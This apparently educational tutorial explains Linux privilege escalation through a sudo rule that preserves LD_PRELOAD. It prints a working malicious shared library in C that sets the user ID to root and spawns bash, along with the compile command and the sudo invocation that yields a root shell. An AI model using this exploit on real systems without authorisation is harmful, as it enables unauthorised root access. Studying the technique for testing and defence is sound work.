# Sudo + LD\_PRELOAD (Shared Libraries)

For this attack, we need user with sudo access to run some command (can be any command) + LD\_PRELOAD variable to persist with sudo call.

**Shared libraries** are collections of precompiled code that can be used by multiple programs simultaneously. They provide a way to modularize code, allowing functions and data to be shared across different applications without the need to duplicate the code.

**LD\_PRELOAD**: An environment variable used in Unix-like operating systems to specify a shared library to be loaded before others when a program is run. It can be used to override functions in standard libraries.

## Understanding the Context:

* If a user has permission to run a program with **sudo**, but that program calls functions from shared libraries (like libc), you can use **LD\_PRELOAD** to inject your own shared library that modifies the behavior of these functions.

## Example User

```
user@pc1:~$ sudo -l
Matching Defaults entries for dollarboysushil on pc1:
    env_reset, mail_badpass,................................. ,env_keep+=LD_PRELOAD

User dollarboysushil may run the following commands on pc1 :
    (root) NOPASSWD: /usr/bin/ping
```



## Attack Scenario

From above example, we can see user dollarboysushil can use ping command as root without root's password.\
Also, we can see `env_keep+=LD_PRELOAD`which means environment variable are preserver when using sudo.

For the attack,\
We are going to craft a malicious shared libraries, then we will include this malicious shared library with the `LD_PRELOAD`variable.\
Then when we run sudo ping, we will be able to load our malicious shared libraries.



### Creating malicious shared libraries

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

in above malicious.c file, we are unsetting our environment variable (LD\_PRELOAD), then we are setting our gid and uid to 0 (root) and then we are spawning bash shell

Compiling this malicious.c

<pre><code><strong>user@pc1 $: gcc -fPIC -shared -o malicious.so malicious.c -nostartfiles
</strong></code></pre>

Here, we are compiling our malicious.c code into shared library file, malicious.so

Then when we run ping as sudo,&#x20;

```
user@pc1 $: sudo LD_PRELOAD=/locatio_of_malicious_library/malicious.so /usr/bin/ping
root@pc2 #: whoami
root
```

We are now, root

Watch this excellent video by conda.[https://youtu.be/bzjnIi5u9OQ?list=PLDrNMcTNhhYrBNZ\_FdtMq-gLFQeUZFzWV](https://youtu.be/bzjnIi5u9OQ?list=PLDrNMcTNhhYrBNZ\_FdtMq-gLFQeUZFzWV)



